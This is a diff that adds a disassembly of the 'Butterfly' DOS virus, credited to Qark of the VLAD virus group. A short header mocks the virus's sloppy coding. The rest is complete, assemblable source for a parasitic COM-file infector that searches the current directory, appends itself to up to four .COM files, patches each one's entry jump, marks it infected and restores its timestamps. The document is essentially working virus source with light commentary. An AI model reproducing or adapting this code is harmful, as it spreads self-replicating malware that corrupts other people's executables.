@@ -1,0 +1,211 @@
+
+;               Butterfly Disassembly
+;                  by Qark/VLAD
+;
+; This poorly written virus is a direct action parasitic com infector that
+; infects four files, if available, in the current directory.
+;
+; It's one claim to fame, is accidentally being included in the Telemate V4.0
+; OAK VGA drivers.
+;
+; It has some lame coding, and some bits of code, that look like they
+; were left in by accident, such as setting a register, and destroying
+; it without using it in the next line.
+;
+; I remember hearing somewhere that this virus is just a hack of the
+; "Fuck John McAfee" virus.  There was a rumour that John McAfee got pissed
+;  at that, and edited it to say "Goddamn Butterflies" instead.
+;
+; This virus is so boring and ordinary I thought it would be the perfect
+; April Fools treat.
+;
+
+
+		org     100h
+
+		jmp     virus_start
+
+		db      1
+orig4:          int     20h     ;offset 104h
+		nop
+		nop
+		
+virus_start:
+		call    get_delta
+get_delta:
+		pop     bp
+		sub     bp,offset get_delta
+
+		;Restore host bytes.
+		mov     di,100h
+		lea     si,[bp+offset orig4]
+		mov     cx,4
+		cld
+		rep     movsb
+
+		;Set DTA to end of virus
+		mov     ah,1ah
+		lea     dx,[bp+newdta]
+		int     21h
+
+		mov     byte ptr [bp+counter],0
+
+		;Find first potential file
+		mov     ah,4eh
+		lea     si,[bp+offset foundname]
+		lea     dx,[bp+comspec]
+		push    dx
+		jmp     short findfile
+exitvirus:
+		;Restore the original DTA
+		mov     ah,1ah
+		mov     dx,80h
+		int     21h
+
+		;Clean the registers before exit
+		xor     ax,ax
+		xor     bx,bx
+		xor     cx,cx
+		xor     dx,dx
+		xor     si,si
+		xor     di,di
+
+		mov     sp,0FFFEh               ;Reset the SP
+
+		;Return to host
+		mov     bp,100h
+		push    bp
+		xor     bp,bp
+		ret
+
+donefile:
+		or      bx,bx                   ;Is there a file handle ?
+		jz      fnext
+
+		;Set CX to attribute, but destroy it immediately.  Error.
+		mov     ch,0
+		mov     cl,byte ptr [bp+attrib]
+
+		;Set original time
+		mov     ax,5701h                ;Set time
+		mov     cx,word ptr [bp+ftime]
+		mov     dx,word ptr [bp+fdate]
+		int     21h
+
+		;Close file
+		mov     ah,3eh
+		int     21h
+
+		xor     bx,bx
+fnext:
+		;Find next
+		mov     ah,4fh
+findfile:
+		pop     dx
+		push    dx
+		mov     cx,7
+		xor     bx,bx
+		int     21h
+
+		jnc     open_file
+		jmp     nomorefiles
+
+Namestring      db      -1,'Goddamn Butterflies',-1
+		
+open_file:
+		mov     dx,si
+		mov     ax,3d02h
+		int     21h
+
+		jc      donefile
+
+		mov     bx,ax
+
+		;Read first four bytes of the file into orig4
+		mov     ah,3fh
+		mov     cx,4
+		lea     dx,[bp+orig4]
+		int     21h
+
+		;Avoid all files with ?????ND?.???
+		;Most probably command.com
+		mov     ax,word ptr [bp+foundname+5]
+		cmp     ax,"DN"
+		je      donefile
+
+		;Check if already infected
+		cmp     byte ptr [bp+orig4+3],1
+		je      donefile
+
+		;Too small ?
+		mov     ax,word ptr [bp+filesize]
+		cmp     ax,121
+		jb      donefile
+
+		;Seek to end of file
+		mov     ax,4202h
+		cwd
+		xor     cx,cx
+		int     21h
+
+		cmp     ax,0fd00h               ;Too big ?
+		ja      donefile
+
+		;Save file size
+		mov     word ptr [bp+savedsize],ax
+
+		;Write original bytes to EOF
+		lea     dx,[bp+orig4]
+		mov     cx,4
+		mov     ah,40h
+		int     21h
+
+		;Write virus to EOF
+		lea     dx,[bp+virus_start]
+		mov     cx,offset newdta - offset virus_start   ;virus size
+		mov     ah,40h
+		int     21h
+
+		;Seek to start of file
+		mov     ax,4200h
+		cwd
+		xor     cx,cx
+		int     21h
+
+		;Calculate JMP to Virus
+		mov     ax,word ptr [bp+savedsize]
+		inc     ax
+		mov     word ptr [bp+orig4+1],ax
+		mov     byte ptr [bp+orig4],0e9h        ;Opcode for JMP
+		mov     byte ptr [bp+orig4+3],1         ;Infected marker
+
+		;Write JMP to Virus
+		lea     dx,[bp+orig4]
+		mov     ah,40h
+		mov     cx,4
+		int     21h
+
+		;Check to see if three files are infected
+		inc     byte ptr [bp+counter]
+		cmp     byte ptr [bp+counter],4
+		jae     stupidjmp
+		jmp     donefile
+nomorefiles:
+		;This routine does nothing.. must be an error.
+		mov     di,100h
+		cmp     word ptr [di],20cdh
+		je      stupidjmp
+stupidjmp:
+		jmp     exitvirus
+
+comspec         db      "*.COM",0
+
+NewDTA          db      15h dup (0)
+attrib          db      0         
+ftime           dw      0
+fdate           dw      0
+filesize        dd      0         
+foundname       db      13 dup (0)
+
+counter         db      0
+savedsize       dw      0
